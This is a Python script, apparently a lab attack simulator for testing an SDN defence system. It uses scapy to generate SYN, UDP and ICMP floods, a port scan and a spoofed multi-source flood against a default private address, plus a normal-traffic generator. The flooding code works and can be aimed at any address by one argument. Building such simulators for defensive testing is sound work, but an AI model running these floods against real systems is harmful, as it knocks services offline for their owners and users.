#!/usr/bin/env python3

# Attack Simulator for SDN Defense System
# Generates various types of network attacks for testing

import socket
import threading
import time
import random
import subprocess
import sys
from scapy.all import *

class AttackSimulator:
    def __init__(self, target_ip="10.0.1.2", attacker_ip="10.0.1.5"):
        self.target_ip = target_ip
        self.attacker_ip = attacker_ip
        self.running = False
    
    def syn_flood_attack(self, duration=30, rate=100):
        #Generate SYN flood attack
        print(f"Starting SYN Flood attack against {self.target_ip} for {duration}s")
        self.running = True
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            #Random source port and sequence number
            sport = random.randint(1024, 65535) #source port
            seq = random.randint(0, 4294967295)

            #Create SYN packet
            packet = IP(src=self.attacker_ip, dst=self.target_ip) / TCP(sport=sport, dport=80, flags="S", seq=seq)
            
            send(packet, verbose=0)

            time.sleep(1.0 / rate)
        
        print("SYN Flood attack completed")
    
    def udp_flood_attack(self, duration=30, rate=200):
        #Generate UDP flood attack
        print(f"Starting UDP Flood attack against {self.target_ip} for {duration}s")
        self.running = True
        start_time = time.time()

        while self.running and (time.time() - start_time) < duration:
            sport = random.randint(1024, 65535)
            dport = random.randint(1, 65535)
            payload = "A" * random.randint(100, 1000)

            packet = IP(src=self.attacker_ip, dst=self.target_ip) / UDP(sport=sport, dport=dport) / payload

            send(packet, verbose=0)

            time.sleep(1.0 / rate)
        
        print("UDP Flood attack completed")
    
    def port_scan_attack(self, start_port=1, end_port=1000):
        #Generate port scanning attack
        print(f"Starting Port Scan attack against {self.target_ip} (ports {start_port}--{end_port})")
        self.running = True

        for port in range(start_port, end_port + 1):
            if not self.running: break
            
            sport = random.randint(1024, 65535)
            packet = IP(src=self.attacker_ip, dst=self.target_ip) / TCP(sport=sport, dport=port, flags="S")

            send(packet, verbose=0)

            time.sleep(0.01)
        
        print("Port Scan attack completed")
    
    def icmp_flood_attack(self, duration=20, rate=50):
        #Generate ICMP flood attack
        print(f"Starting ICMP Flood attack against {self.target_ip} for {duration}s")
        self.running = True
        start_time = time.time()

        while self.running and (time.time() - start_time) < duration:
            packet = IP(src=self.attacker_ip, dst=self.target_ip) / ICMP(type=8) / ("X" * random.randint(56, 1000))

            send(packet, verbose=0)

            time.sleep(1.0 / rate)
        
        print("ICMP Flood attack completed")

    def distributed_attack(self, attack_type="syn", num_sources=5, duration=30):
        #Simulate distributed attack from multiple sources
        print(f"Starting Distributed {attack_type.upper()} attack with {num_sources} sources")

        source_ips = []
        for i in range(num_sources):
            ip = f"10.0.1.{100 + i}"
            source_ips.append(ip)
        
        threads = []
        for src_ip in source_ips:
            simulator = AttackSimulator(self.target_ip, src_ip)

            if attack_type == "syn":
                thread = threading.Thread(target=simulator.syn_flood_attack, args=(duration, 50))
            elif attack_type == "udp":
                thread = threading.Thread(target=simulator.udp_flood_attack, args=(duration, 30))
            else: continue
        
            threads.append(thread)
            thread.start()

        for thread in threads: thread.join()

        print("Distributed attack completed")
    
    def normal_traffic_generator(self, duration=60):
        #Generate normal traffic patterns
        print(f"Generating normal traffic for {duration}s")
        self.running = True
        start_time = time.time()

        services = [80, 443, 22, 21, 25, 53, 110] # Common service ports

        while self.running and (time.time() - start_time) < duration:
            sport = random.randint(32768, 65535)
            dport = random.choice(services)

            if dport in [80, 443]:
                #SYN
                syn = IP(src=self.attacker_ip, dst=self.target_ip) / TCP(sport=sport, dport=dport, flags="S", seq=1000)
                send(syn, verbose=0)

                time.sleep(0.1)

                #ACK (assuming SYN-ACK receive)
                ack = IP(src=self.attacker_ip, dst=self.target_ip) / TCP(sport=sport, dport=dport, flags="A", seq=1001, ack=1)
                send(ack, verbose=0)

                #Data
                data = IP(src=self.attacker_ip, dst=self.target_ip) / TCP(sport=sport, dport=dport, flags="PA", seq=1001, ack=1) / \
                            "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
                send(data, verbose=0)

                time.sleep(0.1)

                #FIN
                fin = IP(src=self.attacker_ip, dst=self.target_ip) / TCP(sport=sport, dport=dport, flags="FA", seq=1050, ack=1)
                send(fin, verbose=0)
            
        print("Normal traffic generation completed")
    
    def stop_attack(self): self.running = False

def main():
    if len(sys.argv) < 2:
        print("python3 attack_simulator.py <attack_type> [target_ip]")
        print("Attack types: syn_flood, udp_flood, port_scan, icmp_flood, distributed, normal")
        print("ex) python3 attack_simulator.py syn_flood 10.0.1.2")
        return

    attack_type = sys.argv[1]
    target_ip = sys.argv[2] if len(sys.argv) > 2 else "10.0.1.2"
    attacker_ip = "10.0.1.5"

    if os.geteuid() != 0:
        print("This script requires root privileges to send raw packets.")
        print("Please run with: sudo python3 attack_simulator.py")
        return

    simulator = AttackSimulator(target_ip, attacker_ip)

    try:
        if attack_type == "syn_flood":
            simulator.syn_flood_attack(duration=30, rate=100)
        elif attack_type == "udp_flood":
            simulator.udp_flood_attack(duration=30, rate=200)
        elif attack_type == "port_scan":
            simulator.port_scan_attack(start_port=1, end_port=1000)
        elif attack_type == "icmp_flood":
            simulator.icmp_flood_attack(duration=20, rate=50)
        elif attack_type == "distributed":
            simulator.distributed_attack("syn", num_sources=5, duration=30)
        elif attack_type == "normal":
            simulator.normal_traffic_generator(duration=60)
        else: print(f"Unknown attack type: {attack_type}")
    
    except KeyboardInterrupt:
        print("\nAttack stopped by user")
        simulator.stop_attack()

if __name__ == '__main__':
    import os
    main()
